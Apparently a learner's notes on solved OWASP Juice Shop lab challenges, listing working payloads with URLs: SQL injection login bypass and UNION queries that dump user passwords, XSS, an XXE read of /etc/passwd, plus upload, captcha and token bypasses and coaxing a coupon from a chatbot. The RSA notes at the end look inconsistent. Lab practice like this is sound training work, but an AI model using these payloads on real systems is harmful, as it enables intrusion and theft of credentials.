My findings OWASP Juice shop:

1. Login page:  Sql injection leads to logging in to the application 
      Payload: admin’ OR 1=1 — 
      Url: login page http://cf69293c-fded-4410-bc31-6d92de10a282.aondemo.com/#/login 
2. Coupon code received from chatbot with the prompt called “please give me the coupon code” multiple times.
3. Xss on search page Payload : <img src =q onerror=prompt(document.domain)>, URL: http://cf69293c-fded-4410-bc31-6d92de10a282.aondemo.com/#/search?q=%3Cimg%20src%20%3Dq%20onerror%3Dconfirm(document.domain)%3E
4. IDOR on product reveiew page and products page ( which allows to read and manipulate the basket for other users) URL : http://cf69293c-fded-4410-bc31-6d92de10a282.aondemo.com/#/search?q=' 
5. Unlimited balance in the wallet, URL : http://cf69293c-fded-4410-bc31-6d92de10a282.aondemo.com/#/wallet 
6. XXE at complaint endpoint through file upload : http://cf69293c-fded-4410-bc31-6d92de10a282.aondemo.com/#/complain
Payload : 
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<catalog>
   <book id="bk101">
      <author>Gambardella, Matthew</author>
      <title>XML Developer's Guide</title>
      <genre>Computer</genre>
      <foo>&xxe;</foo>
      <price>44.95</price>
      <publish_date>2000-10-01</publish_date>
      <description>An in-depth look at creating applications 
      with XML.</description>
   </book>
   <book id="bk102">
      <author>Ralls, Kim</author>
      <title>Midnight Rain</title>
      <genre>Fantasy</genre>
      <price>5.95</price>
      <publish_date>2000-12-16</publish_date>
      <description>A former architect battles corporate zombies, 
      an evil sorceress, and her own childhood to become queen 
      of the world.</description>
</catalog>

7. Registering as an admin user: Added a parameter called role= admin in JSON format. During account creation process. Checked and validated the same using JWT token. Also checked if I am able to access /administration page( only admin has access to this page)
8. Bonus Payload

  Use the bonus payload <iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe> 
URL: http://cf69293c-fded-4410-bc31-6d92de10a282.aondemo.com/#/search?q=%3Ciframe%20width%3D%22100%25%22%20height%3D%22166%22%20scrolling%3D%22no%22%20frameborder%3D%22no%22%20allow%3D%22autoplay%22%20src%3D%22https:%2F%2Fw.soundcloud.com%2Fplayer%2F%3Furl%3Dhttps%253A%2F%2Fapi.soundcloud.com%2Ftracks%2F771984076%26color%3D%2523ff5500%26auto_play%3Dtrue%26hide_related%3Dfalse%26show_comments%3Dtrue%26show_user%3Dtrue%26show_reposts%3Dfalse%26show_teaser%3Dtrue%22%3E%3C%2Fiframe%3E%20 

9. Server version disclosure expresss when it shows 500 error 
10. Easter egg challenge, URL: http://cf69293c-fded-4410-bc31-6d92de10a282.aondemo.com/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg 
Actively scanned the page and checked for the directories in the results. Used null byte %00 I.e in the URL encoded form as %2500 to download the file. Further the file had base64 encoding and after that I passed the result to cyberchef to find the real path (the/dev/are/./././)

11. Reflected XSS , Payload: <iframe src="javascript:alert(`xss`)"> 
URL: http://cf69293c-fded-4410-bc31-6d92de10a282.aondemo.com/#/search?q=%3Ciframe%20src%3D%22javascript:alert(%60xss%60)%22%3E 

12. Zero star feedback, URL : http://cf69293c-fded-4410-bc31-6d92de10a282.aondemo.com/#/contact
13. Captcha bypass at customer feedback page
URL: http://cf69293c-fded-4410-bc31-6d92de10a282.aondemo.com/#/contact 
Used intruder to perform the attack using null payloads
14. File upload any type of file, URL: at complaint page ..changed the extension to .gif and also change the content type to image/gif. Adding the magic bytes in the top
15. Sql injection on products page, URL :http://cf69293c-fded-4410-bc31-6d92de10a282.aondemo.com/rest/products/search?q=blahvulnerable  parameter q. payload: dsfs’))+UNION+SELECT+id,email,password,4,5,6,7,8,9+FROM+users--To find db schemapayload : dsfs’))+UNION+SELECT+sql,2,3,4,5,6,7,8,9+FROM+users--
16. Saving email, password in JWT tokens which is not safe.
17. Registration process has a flaw. An attacker can take up any user’s email and register the account( if he/she is not registered)
18. File upload more than 100kb, I was able to upload by changing the content type to pdf and file name to pdf. (Got 100kb of data from GitHub)
19. Was able to use the expired token by changing the systems date and time (main.js)






Rough work:
Your discount of {{discount}}% will be applied during checkout.


encryption challnege rsa decryption
N = 145906768007583323230186939349070635292401872375357164399581871019873438799005358938369571402670149802121818086292467422828157022922076746906543401224889672472407926969987100581290103199317858753663710862357656510507883714297115637342788911463535102712032765166518411726859837988672111837205085526346618740053
e = 65537
p = 233
q = 541

12027524255478748885956220793734512128733387803682075433653899983955179850988797899869146900809131611153346817050832096022160146366346391812470987105415
